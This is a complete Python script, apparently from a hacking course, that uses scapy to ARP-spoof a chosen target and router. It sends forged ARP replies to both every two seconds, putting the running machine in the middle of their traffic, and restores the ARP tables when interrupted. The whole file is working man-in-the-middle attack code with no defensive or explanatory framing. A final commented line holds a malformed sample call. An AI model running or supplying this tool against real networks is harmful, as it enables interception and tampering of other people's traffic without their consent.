#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--router", dest="router", help="IP of router")
    parser.add_argument("-t", "--target", dest="target", help="IP of target")
    args = parser.parse_args()
    if not args.router:
        parser.error("No router IP provided, use --help")
    elif not args.target:
         parser.error("No target IP provided, use --help")
    return args


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return(answered_list[0][1].hwsrc)

def spoof_ip(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_IP, source_IP):
    destination_mac = get_mac(destination_IP)
    source_mac = get_mac(source_IP)
    packet = scapy.ARP(op=2, pdst=destination_IP, hwdst=destination_mac, psrc=source_IP, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

sent_packets_count = 0
args = get_arguments()
# print(args.ip, args.router) #this works
print("Press CTRL + C to stop ARP Spoofing")
try:
    while True:
        spoof_ip(args.target, args.router)
        spoof_ip(args.router, args.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
        # print("\r[+] Packets Sent: " + str(sent_packets_count)), #this is the python2.7 way of doing things
        # sys.stdout.flush() #this is the python2.7 way of doing things.
        time.sleep(2)
except KeyboardInterrupt:
    print("\r\n[-] Detected CTRL + C.....Quitting and resetting ARP tables on both machines")
    restore(args.target, args.router)
    restore(args.router, args.target)

# sendrequest("10.10.10.10","01:02:03:04:05","192.168.1.1.")